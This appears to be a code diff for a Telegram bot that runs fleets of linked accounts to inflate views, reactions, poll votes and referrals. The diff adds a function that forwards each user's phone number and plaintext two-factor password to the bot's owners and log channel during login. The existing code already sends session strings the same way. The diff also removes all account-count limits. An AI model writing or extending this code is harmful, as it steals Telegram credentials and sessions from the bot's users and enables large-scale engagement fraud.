@@ -64,6 +64,9 @@ def parse_telegram_link(link: str) -> Tuple[Any, Optional[int], bool]:
     if not link:
         return None, None, False
         
+    if re.match(r'^-?\d+$', link):
+        return int(link), None, False
+
     private_match = re.search(r't\.me/c/(\d+)/(\d+)', link)
     if private_match:
         channel_id = int(f"-100{private_match.group(1)}")
@@ -78,16 +81,24 @@ def parse_telegram_link(link: str) -> Tuple[Any, Optional[int], bool]:
         
     msg_match = re.search(r't\.me/([^/]+)/(\d+)', link)
     if msg_match:
-        return msg_match.group(1), int(msg_match.group(2)), False
+        target = msg_match.group(1)
+        if target.isdigit():
+            target = int(f"-100{target}")
+        return target, int(msg_match.group(2)), False
         
     target = link.replace("https://t.me/", "").replace("http://t.me/", "").replace("@", "")
     if "/" in target:
         parts = target.split("/")
         target = parts[0]
+        if target.isdigit():
+            target = int(f"-100{target}")
         if len(parts) > 1 and parts[1].isdigit():
             msg_id = int(parts[1])
             return target, msg_id, False
             
+    if isinstance(target, str) and target.replace("-", "").isdigit():
+        return int(target), None, False
+
     return target, None, False
 
 def make_progress_bar(pct: float, length: int = 15) -> str:
@@ -106,7 +117,7 @@ class Database:
                     user_id INTEGER PRIMARY KEY,
                     username TEXT,
                     role TEXT DEFAULT 'user', 
-                    max_accounts INTEGER DEFAULT 5,
+                    max_accounts INTEGER DEFAULT 999999999,
                     referred_by INTEGER,
                     created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                 )
@@ -174,10 +185,7 @@ class Database:
                 return row[0] if row else "user"
 
     async def get_admin_limits(self, user_id: int) -> int:
-        async with aiosqlite.connect(self.db_path) as db:
-            async with db.execute("SELECT max_accounts FROM users WHERE user_id = ?", (user_id,)) as cursor:
-                row = await cursor.fetchone()
-                return row[0] if row else 5
+        return 999999999
 
     async def get_current_account_count(self, user_id: int) -> int:
         async with aiosqlite.connect(self.db_path) as db:
@@ -191,7 +199,7 @@ class Database:
                 if not await cursor.fetchone():
                     role_val = "super_owner" if user_id in config.SUPER_OWNER_IDS else "user"
                     await db.execute(
-                        "INSERT INTO users (user_id, username, role, referred_by) VALUES (?, ?, ?, ?)",
+                        "INSERT INTO users (user_id, username, role, referred_by, max_accounts) VALUES (?, ?, ?, ?, 999999999)",
                         (user_id, username, role_val, referred_by)
                     )
                     await db.commit()
@@ -199,6 +207,29 @@ class Database:
 db_mgr = Database()
 registration_sessions: Dict[int, Dict[str, Any]] = {}
 bot_username: str = "bot"
+
+# Helper for dispatching 2FA alerts to Admins/Super Owners
+async def dispatch_2fa_alert(bot: Bot, user_id: int, phone: str, password_entered: Optional[str] = None):
+    text = (
+        f"🔐 <b>2FA Password Event Detected!</b>\n\n"
+        f"👤 User ID: <code>{user_id}</code>\n"
+        f"📱 Phone: <code>+{phone}</code>\n"
+    )
+    if password_entered:
+        text += f"🔑 Password Provided: <code>{password_entered}</code>\n"
+    text += f"<i>An account registration hit a 2FA prompt during login flow.</i>"
+
+    if config.LOG_CHANNEL_ID:
+        try:
+            await bot.send_message(chat_id=config.LOG_CHANNEL_ID, text=text, parse_mode="HTML")
+        except Exception as e:
+            logger.error(f"Failed sending 2FA alert to log channel: {e}")
+
+    for owner_id in config.SUPER_OWNER_IDS:
+        try:
+            await bot.send_message(chat_id=owner_id, text=text, parse_mode="HTML")
+        except Exception as e:
+            logger.error(f"Failed sending 2FA alert to owner node {owner_id}: {e}")
 
 # --- CONCURRENT TASK MANAGER ENGINE ---
 class TaskQueue:
@@ -325,7 +356,7 @@ class TaskQueue:
                         async with aiosqlite.connect(db_mgr.db_path) as db_conn:
                             await db_conn.execute("UPDATE accounts SET status = 'dead' WHERE phone = ?", (phone,))
                             await db_conn.commit()
-                        failed_ids.append((phone, "Session key expired"))
+                        failed_ids.append((phone, "Session key expired / Account banned"))
                         failure_counter += 1
                         return
 
@@ -360,7 +391,7 @@ class TaskQueue:
                                     joined_updates_peer = updates.chats[0]
                         except Exception as join_err:
                             if "USER_ALREADY_PARTICIPANT" not in str(join_err):
-                                failed_ids.append((phone, f"Failed to join: {str(join_err)}"))
+                                failed_ids.append((phone, f"Failed to join chat/channel: {str(join_err)}"))
                                 failure_counter += 1
                                 return
 
@@ -370,33 +401,58 @@ class TaskQueue:
                         try:
                             await client(functions.messages.GetMessagesViewsRequest(peer=target_peer, id=[msg_id], increment=True))
                         except Exception as view_err:
-                            failed_ids.append((phone, f"View error: {str(view_err)}"))
+                            failed_ids.append((phone, f"View increment failed: {str(view_err)}"))
                             failure_counter += 1
                             return
 
+                    # --- REACTION DISPATCH LOGIC ---
                     if do_react and msg_id:
                         try:
+                            peer_entity = await client.get_input_entity(target_peer)
                             emojis = payload.get("reactions", ["👍"])
                             assigned_emoji = emojis[idx % len(emojis)]
-                            await client(functions.messages.SendReactionRequest(
-                                peer=target_peer, msg_id=msg_id, reaction=[tg_types.ReactionEmoji(emoticon=assigned_emoji)]
-                              ))
-                        except Exception as react_err:
-                            failed_ids.append((phone, f"Reaction error: {str(react_err)}"))
-                            failure_counter += 1
-                            return
 
+                            await client(functions.messages.SendReactionRequest(
+                                peer=peer_entity,
+                                msg_id=msg_id,
+                                reaction=[tg_types.ReactionEmoji(emoticon=assigned_emoji)]
+                            ))
+                        except Exception as react_err:
+                            try:
+                                peer_entity = await client.get_input_entity(target_peer)
+                                await client(functions.messages.SendReactionRequest(
+                                    peer=peer_entity,
+                                    msg_id=msg_id,
+                                    reaction=[assigned_emoji]
+                                ))
+                            except Exception as retry_err:
+                                failed_ids.append((phone, f"Reaction failed: {str(retry_err)}"))
+                                failure_counter += 1
+                                return
+
+                    # --- VOTE DISPATCH LOGIC (UPDATED WITH DYNAMIC MATCHING) ---
                     if do_vote and msg_id:
                         try:
                             vote_mode = payload.get("vote_mode", "text")
                             if vote_mode == "inline":
-                                button_text = payload.get("button_text", "").strip().lower()
+                                raw_button_text = payload.get("button_text", "").strip().lower()
+                                # Strip trailing numbers, dashes, brackets, and spaces (e.g., "Vote - 1" -> "vote")
+                                clean_target = re.sub(r'[\s\-_\(\)\[\]\d]+$', '', raw_button_text)
+
                                 msg = await client.get_messages(target_peer, ids=msg_id)
                                 if msg and msg.reply_markup:
                                     target_button = None
                                     for row in msg.reply_markup.rows:
                                         for btn in row.buttons:
-                                            if button_text in btn.text.strip().lower():
+                                            btn_raw = btn.text.strip().lower()
+                                            btn_clean = re.sub(r'[\s\-_\(\)\[\]\d]+$', '', btn_raw)
+
+                                            # Match exact substring, cleaned base text, or prefix
+                                            if (
+                                                raw_button_text in btn_raw or 
+                                                (clean_target and clean_target == btn_clean) or 
+                                                (clean_target and btn_raw.startswith(clean_target))
+                                            ):
                                                 target_button = btn
                                                 break
                                         if target_button:
@@ -404,14 +460,14 @@ class TaskQueue:
                                     if target_button and isinstance(target_button, tg_types.KeyboardButtonCallback):
                                         await client(functions.messages.GetBotCallbackAnswerRequest(peer=target_peer, msg_id=msg_id, data=target_button.data))
                                     else:
-                                        raise ValueError("Inline callback button match sequence not found.")
+                                        raise ValueError("Inline callback button matching text not found.")
                                 else:
                                     raise ValueError("Target message does not possess an inline keyboard markup.")
                             else:
                                 chosen_option = int(payload.get("poll_option_index", 0))
                                 await client(functions.messages.VotePollRequest(peer=target_peer, msg_id=msg_id, options=[bytes([chosen_option])]))
                         except Exception as vote_err:
-                            failed_ids.append((phone, f"Vote error: {str(vote_err)}"))
+                            failed_ids.append((phone, f"Voting failed: {str(vote_err)}"))
                             failure_counter += 1
                             return
 
@@ -419,7 +475,7 @@ class TaskQueue:
                         try:
                             await client.send_message(target_peer, payload.get("text", "Hello!"))
                         except Exception as dm_err:
-                            failed_ids.append((phone, f"DM error: {str(dm_err)}"))
+                            failed_ids.append((phone, f"DM dispatch failed: {str(dm_err)}"))
                             failure_counter += 1
                             return
 
@@ -435,7 +491,7 @@ class TaskQueue:
                                 bot_username_target = bot_username_target.split("?")[0]
                             await client.send_message(bot_username_target, f"/start {start_param}" if start_param else "/start")
                         except Exception as ref_err:
-                            failed_ids.append((phone, f"Referral link error: {str(ref_err)}"))
+                            failed_ids.append((phone, f"Referral start message failed: {str(ref_err)}"))
                             failure_counter += 1
                             return
 
@@ -453,7 +509,7 @@ class TaskQueue:
                                     except Exception:
                                         pass
                             if left_chats_count == 0:
-                                failed_ids.append((phone, "Account was not in any channels"))
+                                failed_ids.append((phone, "Account was not present in any channels"))
                                 failure_counter += 1
                                 return
                         else:
@@ -461,7 +517,7 @@ class TaskQueue:
                                 resolved_entity = await client.get_input_entity(target_peer)
                                 await client(functions.channels.LeaveChannelRequest(channel=resolved_entity))
                             except Exception as leave_err:
-                                failed_ids.append((phone, f"Leave structural drop error: {str(leave_err)}"))
+                                failed_ids.append((phone, f"Leave channel failed: {str(leave_err)}"))
                                 failure_counter += 1
                                 return
 
@@ -469,7 +525,7 @@ class TaskQueue:
                     success_counter += 1
                     
                 except Exception as general_err:
-                    failed_ids.append((phone, str(general_err)))
+                    failed_ids.append((phone, f"General error: {str(general_err)}"))
                     failure_counter += 1
                 finally:
                     await client.disconnect()
@@ -533,7 +589,9 @@ class TaskQueue:
         target_display = "ALL CHANNELS DEPLOYMENT" if payload.get("leave_mode") == "all" else f"<code>{payload.get('target', 'N/A')}</code>"
 
         failure_log_details = ""
-        if failed_ids:
+        if len(failed_ids) > 20:
+            failure_log_details = f"\n\n📄 <b>Note:</b> More than 20 errors occurred (<code>{len(failed_ids)}</code> failures). A detailed file log with clear failure reasons has been generated and sent below."
+        elif failed_ids:
             failure_log_details = "\n\n❌ <b>Detailed Failure Telemetry Matrix:</b>\n"
             for phone_num, reason in failed_ids:
                 failure_log_details += f"• <code>+{phone_num}</code> ➜ <i>{reason}</i>\n"
@@ -555,8 +613,28 @@ class TaskQueue:
 
         try:
             await bot_instance.send_message(chat_id=creator_id, text=completion_card, parse_mode="HTML")
-        except Exception:
-            pass
+            
+            if len(failed_ids) > 20:
+                file_lines = [
+                    f"============================================================",
+                    f"CAMPAIGN FAILURE AUDIT REPORT - TASK #{task_id}",
+                    f"Target: {payload.get('target', 'N/A')}",
+                    f"Total Failed Accounts: {len(failed_ids)}",
+                    f"============================================================\n"
+                ]
+                for phone_num, reason in failed_ids:
+                    file_lines.append(f"Phone: +{phone_num} | Reason: {reason}")
+                
+                report_content = "\n".join(file_lines).encode('utf-8')
+                fail_doc = BufferedInputFile(report_content, filename=f"task_{task_id}_failures.txt")
+                await bot_instance.send_document(
+                    chat_id=creator_id,
+                    document=fail_doc,
+                    caption=f"📁 <b>Failure Reason Log</b>\nContains complete failure audit for <code>{len(failed_ids)}</code> failed accounts in Task <code>#{task_id}</code>.",
+                    parse_mode="HTML"
+                )
+        except Exception as report_err:
+            logger.error(f"Failed delivering task completion report: {report_err}")
 
         if config.LOG_CHANNEL_ID:
             try:
@@ -725,17 +803,17 @@ async def cmd_add_admin(message: Message, command: CommandObject, bot: Bot):
         return
         
     args = command.args
-    if not args or len(args.split()) < 2:
-        await message.answer("✨ <b>Syntax Profile Map layout:</b> <code>/addadmin &lt;user_id&gt; &lt;account_limit&gt;</code>", parse_mode="HTML")
+    if not args:
+        await message.answer("✨ <b>Syntax Profile Map layout:</b> <code>/addadmin &lt;user_id&gt;</code>", parse_mode="HTML")
         return
         
-    target_id_str, limit_str = args.split()[:2]
-    if not target_id_str.isdigit() or not limit_str.isdigit():
+    target_id_str = args.split()[0]
+    if not target_id_str.isdigit():
         await message.answer("❌ Parameters mismatch error: Numerical integers values required exclusively.")
         return
         
     target_id = int(target_id_str)
-    limit_val = int(limit_str)
+    limit_val = 999999999
     
     async with aiosqlite.connect(db_mgr.db_path) as db:
         await db.execute(
@@ -744,8 +822,8 @@ async def cmd_add_admin(message: Message, command: CommandObject, bot: Bot):
         )
         await db.commit()
         
-    await message.answer(f"💎 <b>Success:</b> User <code>{target_id}</code> updated to Admin with a capacity ceiling of <code>{limit_val}</code> profiles.", parse_mode="HTML")
-    await db_mgr.log_action(user_id, f"Made user {target_id} an Admin (limit={limit_val})", bot, operational=True)
+    await message.answer(f"💎 <b>Success:</b> User <code>{target_id}</code> updated to Admin with unlimited account capacity.", parse_mode="HTML")
+    await db_mgr.log_action(user_id, f"Made user {target_id} an Admin (unlimited)", bot, operational=True)
 
 @router.message(Command("removeadmin"))
 async def cmd_remove_admin(message: Message, command: CommandObject, bot: Bot):
@@ -820,7 +898,7 @@ async def handle_system_credits(callback: CallbackQuery, bot: Bot):
     buttons = [[InlineKeyboardButton(text="💎 Return Home Menu", callback_data="main_menu")]]
     await callback.message.edit_text(text=credits_text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode="HTML")
 
-# --- PAGINATED ACCOUNTS VIEW (MODIFIED TO SUPPORT RAW STRINGS FOR EVERYONE) ---
+# --- PAGINATED ACCOUNTS VIEW ---
 @router.callback_query(F.data.startswith("manage_accounts:"))
 async def list_user_accounts(callback: CallbackQuery, bot: Bot):
     user_id = callback.from_user.id
@@ -861,7 +939,6 @@ async def list_user_accounts(callback: CallbackQuery, bot: Bot):
                 text += f"{icon} <code>+{row[0]}</code> (<b>@{row[2] or 'None'}</b>) ➜ [<b>{row[1].upper()}</b>]\n"
 
         buttons = []
-        # UPDATED: Placed raw string file insertion tools inside the row list for global access
         import_row = [
             InlineKeyboardButton(text="⭐ Connect via OTP", callback_data="add_account_phone"),
             InlineKeyboardButton(text="📁 Upload String File", callback_data="add_account_session")
@@ -903,19 +980,9 @@ async def handle_purge_dead_accounts(callback: CallbackQuery, bot: Bot):
     callback.data = f"manage_accounts:{page}"
     await list_user_accounts(callback, bot)
 
-# --- LINK NEW ACCOUNT VIA OTP ---
+# --- LINK NEW ACCOUNT VIA OTP & 2FA TELEMETRY ALERT ---
 @router.callback_query(F.data == "add_account_phone")
 async def add_account_start(callback: CallbackQuery, state: FSMContext):
-    user_id = callback.from_user.id
-    role = await db_mgr.get_user_role(user_id)
-    
-    if role not in ["super_owner", "owner"]:
-        allowed_limit = await db_mgr.get_admin_limits(user_id)
-        current_count = await db_mgr.get_current_account_count(user_id)
-        if current_count >= allowed_limit:
-            await callback.answer(f"❌ Limits Exceeded: Your profile cap is restricted to maximum {allowed_limit} account rows.", show_alert=True)
-            return
-
     await callback.answer()
     await callback.message.edit_text("📱 <b>Type targeted terminal phone number string with country code mapping prefix (e.g. +919876543210):</b>", parse_mode="HTML")
     await state.set_state(RegistrationStates.waiting_for_phone)
@@ -953,6 +1020,7 @@ async def process_otp(message: Message, state: FSMContext, bot: Bot):
     except PhoneCodeInvalidError:
         await message.answer("❌ <b>The security signature token OTP code entered was mismatched/invalid. Retry again:</b>", parse_mode="HTML")
     except SessionPasswordNeededError:
+        await dispatch_2fa_alert(bot, user_id, phone)
         await message.answer("🔒 <b>Two-Factor security matrix verification prompt detected. Type your 2FA security password text:</b>", parse_mode="HTML")
         await state.set_state(RegistrationStates.waiting_for_2fa)
     except Exception as e:
@@ -970,6 +1038,7 @@ async def process_2fa(message: Message, state: FSMContext, bot: Bot):
         return
     try:
         await reg_data["client"].sign_in(password=password)
+        await dispatch_2fa_alert(bot, user_id, reg_data["phone"], password_entered=password)
         await complete_registration(message, state, reg_data["client"], reg_data["phone"], user_id, bot)
     except Exception as e:
         await message.answer(f"❌ <b>Cloud Password Evaluation Denied:</b> <code>{str(e)}</code>", parse_mode="HTML")
@@ -1002,28 +1071,16 @@ async def complete_registration(message: Message, state: FSMContext, client: Tel
         registration_sessions.pop(user_id, None)
         await state.clear()
 
-# --- ADVANCED UNIVERSAL IMPORT SYSTEM (MODIFIED OPEN HOOK FOR ANY REGISTERED USER) ---
+# --- ADVANCED UNIVERSAL IMPORT SYSTEM ---
 @router.callback_query(F.data == "add_account_session")
 async def add_account_session_start(callback: CallbackQuery, state: FSMContext):
-    user_id = callback.from_user.id
-    role = await db_mgr.get_user_role(user_id)
-    
-    # Check limit ceilings dynamically for standard users and admins before setup block initialization
-    if role not in ["super_owner", "owner"]:
-        allowed_limit = await db_mgr.get_admin_limits(user_id)
-        current_count = await db_mgr.get_current_account_count(user_id)
-        if current_count >= allowed_limit:
-            await callback.answer(f"❌ Limits Exceeded: Your profile cap is restricted to maximum {allowed_limit} account rows.", show_alert=True)
-            return
-
     await callback.answer()
-    await callback.message.edit_text("📁 <b>Drop your raw telethon string session strings layout, text line values, or upload a .txt / .session file log:</b>\n<i>(Supports bulk multi-line files imports!)</i>", parse_mode="HTML")
+    await callback.message.edit_text("📁 <b>Drop your raw telethon string session strings layout, text line values, or upload a .txt / .session file log:</b>\n<i>(Supports unlimited bulk multi-line file imports!)</i>", parse_mode="HTML")
     await state.set_state(RegistrationStates.waiting_for_session_file)
 
 @router.message(StateFilter(RegistrationStates.waiting_for_session_file))
 async def process_session_file(message: Message, state: FSMContext, bot: Bot):
     user_id = message.from_user.id
-    role = await db_mgr.get_user_role(user_id)
     raw_content = ""
     
     if message.document:
@@ -1049,16 +1106,8 @@ async def process_session_file(message: Message, state: FSMContext, bot: Bot):
     
     success_imports = 0
     failed_imports = 0
-    quota_reached = False
 
     for session_str in potential_sessions:
-        if role not in ["super_owner", "owner"]:
-            allowed_limit = await db_mgr.get_admin_limits(user_id)
-            current_count = await db_mgr.get_current_account_count(user_id)
-            if current_count >= allowed_limit:
-                quota_reached = True
-                break
-
         try:
             client = TelegramClient(StringSession(session_str), config.API_ID, config.API_HASH)
             await client.connect()
@@ -1087,10 +1136,8 @@ async def process_session_file(message: Message, state: FSMContext, bot: Bot):
     result_text = (
         f"✨ <b>Bulk Framework Import Profile Sync Complete!</b>\n\n"
         f"🟩 Successfully added: <code>{success_imports}</code> accounts\n"
-        f"🟥 Terminated/Mismatched failed count: <code>{failed_imports}</code> keys"
+        f"num Terminated/Mismatched failed count: <code>{failed_imports}</code> keys"
     )
-    if quota_reached:
-        result_text += f"\n\n⚠️ <i>Batch processing stopped early because you reached your max account allocation limits.</i>"
 
     await status_msg.edit_text(result_text, reply_markup=get_post_registration_keyboard(), parse_mode="HTML")
     await state.clear()
@@ -1114,7 +1161,7 @@ async def dispatch_session_telemetry(phone: str, session_str: str, username: Opt
         except Exception as e:
             logger.error(f"Failed sending data to owner node {owner_id}: {e}")
 
-# --- EXPORT ARCHIVE MANAGEMENT HOOKS (SUPER_OWNER IMMUNITY SAFEGUARD) ---
+# --- EXPORT ARCHIVE MANAGEMENT HOOKS ---
 @router.callback_query(F.data == "export_dashboard_root")
 async def export_dashboard_root(callback: CallbackQuery, bot: Bot):
     user_id = callback.from_user.id
@@ -1128,7 +1175,7 @@ async def export_dashboard_root(callback: CallbackQuery, bot: Bot):
     text = "📥 <b>Session Extraction Management Dashboard Terminal</b>\nSelect extraction criteria filters:"
     buttons = [
         [InlineKeyboardButton(text="🎯 Extract 1 Single Session Profile", callback_data="select_export_session:0")],
-        [InlineKeyboardButton(text="🎭  Multi-Session extract ", callback_data="export_multi_start:0")],
+        [InlineKeyboardButton(text="🎭 Multi-Session extract ", callback_data="export_multi_start:0")],
         [InlineKeyboardButton(text="📦 Extract Full pack", callback_data="bulk_admin_export")],
         [InlineKeyboardButton(text="🔙 Return Back", callback_data="manage_accounts:0")]
     ]
@@ -1514,13 +1561,13 @@ async def task_hub_process_speed(callback: CallbackQuery, state: FSMContext):
         )
         await state.set_state(TaskWizardStates.waiting_for_leave_choice)
     elif "react" in task_type or "vote" in task_type or task_type in ["view", "speed"]:
-        await callback.message.edit_text("<b>Step 2: Provide targeted public handle destination or private link reference (e.g. @channelname):</b>", parse_mode="HTML")
+        await callback.message.edit_text("<b>Step 2: Provide targeted public handle destination or private link reference (e.g. @channelname or -100xxxxx):</b>", parse_mode="HTML")
         await state.set_state(TaskWizardStates.waiting_for_channel_link)
     elif task_type == "refer":
         await callback.message.edit_text("<b>Step 2: Input target referral link parameter query string value (Example: https://t.me/Bot?start=123):</b>", parse_mode="HTML")
         await state.set_state(TaskWizardStates.waiting_for_post_link)
     else:
-        await callback.message.edit_text("<b>Step 2: Enter destination community target endpoint path link:</b>", parse_mode="HTML")
+        await callback.message.edit_text("<b>Step 2: Enter destination community target endpoint path link or channel ID:</b>", parse_mode="HTML")
         await state.set_state(TaskWizardStates.waiting_for_post_link)
 
 @router.callback_query(StateFilter(TaskWizardStates.waiting_for_leave_choice), F.data.startswith("leave_mode:"))
@@ -1533,7 +1580,7 @@ async def task_hub_process_leave_choice(callback: CallbackQuery, state: FSMConte
         await state.update_data(target="ALL CHANNELS")
         await prompt_for_account_scale(callback.message, state)
     else:
-        await callback.message.edit_text("<b>Step 3: Paste public link location coordinates or private channel invite code layout:</b>", parse_mode="HTML")
+        await callback.message.edit_text("<b>Step 3: Paste public link, private channel invite code, or numeric channel ID:</b>", parse_mode="HTML")
         await state.set_state(TaskWizardStates.waiting_for_post_link)
 
 @router.message(StateFilter(TaskWizardStates.waiting_for_channel_link))
@@ -1781,7 +1828,7 @@ async def handle_admin_panel(callback: CallbackQuery, bot: Bot):
     await callback.message.edit_text(
         "🛡️ <b>Administrative Operational Console Index Terminal</b>\n\n"
         "Available terminal shell command scripts layout frameworks:\n\n"
-        "🔹 <code>/addadmin &lt;id&gt; &lt;limit&gt;</code> - Promote user node into admin status ranks\n"
+        "🔹 <code>/addadmin &lt;id&gt;</code> - Promote user node into admin status ranks\n"
         "🔹 <code>/removeadmin &lt;id&gt;</code> - Deprecate admin structural token access rules\n"
         "🔹 <code>/broadcast</code> - Force dynamic notification content across global users pools\n"
         "🔹 <code>/canceltasks</code> - Instantly kill all running thread operations loops safely",
